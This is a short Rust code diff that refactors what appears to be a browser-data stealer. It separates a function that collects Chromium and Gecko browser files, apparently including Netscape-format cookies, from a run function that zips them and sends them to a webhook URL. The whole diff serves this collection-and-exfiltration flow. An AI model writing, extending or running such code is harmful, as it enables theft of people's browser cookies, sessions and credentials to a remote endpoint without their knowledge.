@@ -6,7 +6,7 @@ mod netscape;
 pub mod sender;
 mod zip_layout;
 
-pub async fn run(client: &reqwest::Client, webhook_url: &str) -> Result<(), Box<dyn std::error::Error>> {
+pub fn extract_all() -> Vec<(String, String)> {
     let mut all_files: Vec<(String, String)> = Vec::new();
 
     crate::logs!("chromium + gecko extract (parallel)...");
@@ -21,12 +21,15 @@ pub async fn run(client: &reqwest::Client, webhook_url: &str) -> Result<(), Box<
 
     zip_layout::sort_entries(&mut all_files);
     crate::logf!("total zip entries: {}", all_files.len());
+    all_files
+}
 
-    if !all_files.is_empty() {
-        sender::send_zip(client, webhook_url, &all_files).await?;
+pub async fn run(client: &reqwest::Client, webhook_url: &str) -> Result<(), Box<dyn std::error::Error>> {
+    let files = extract_all();
+    if !files.is_empty() {
+        sender::send_zip(client, webhook_url, &files).await?;
     } else {
         crate::logs!("no browser files to send (zip skipped)");
     }
-
     Ok(())
 }
